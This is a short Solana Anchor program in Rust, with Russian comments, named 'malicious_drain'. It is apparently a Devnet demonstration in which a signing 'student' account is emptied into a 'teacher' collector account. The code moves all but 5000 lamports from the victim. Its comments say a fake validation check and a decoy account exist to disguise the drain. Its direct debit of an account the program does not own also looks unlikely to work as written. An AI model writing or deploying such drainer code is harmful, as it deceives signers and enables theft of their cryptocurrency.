use anchor_lang::prelude::*;

declare_id!("EiGdyaabf7VFa9V1dar87nJ1Px75aTuko95LafMATi1R"); // твой Devnet-адрес

#[program]
pub mod malicious_drain {
    use super::*;

    pub fn confuse_and_drain(ctx: Context<DrainSol>) -> Result<()> {
        let from = ctx.accounts.victim.to_account_info();
        let to = ctx.accounts.collector.to_account_info();

        // Ложная проверка (чтобы замаскировать вызов)
        msg!("Running initial validations...");
        require!(ctx.accounts.fake_account.key() != Pubkey::default(), DrainError::FakeCheckFailed);

        // Перевод SOL — практически всего, оставив 5000 лампортов
        let amount = from.lamports()
            .checked_sub(5000)
            .ok_or(DrainError::NotEnoughBalance)?;

        **from.try_borrow_mut_lamports()? -= amount;
        **to.try_borrow_mut_lamports()? += amount;

        msg!("Done.");
        Ok(())
    }
}

#[derive(Accounts)]
pub struct DrainSol<'info> {
    #[account(mut, signer)]
    pub victim: AccountInfo<'info>, // Студент
    #[account(mut)]
    pub collector: AccountInfo<'info>, // Препод
    /// CHECK: фейковый аккаунт для отвлечения внимания
    pub fake_account: AccountInfo<'info>,
    pub system_program: Program<'info, System>,
}

#[error_code]
pub enum DrainError {
    #[msg("Fake check failed.")]
    FakeCheckFailed,
    #[msg("Not enough balance to drain.")]
    NotEnoughBalance,
}
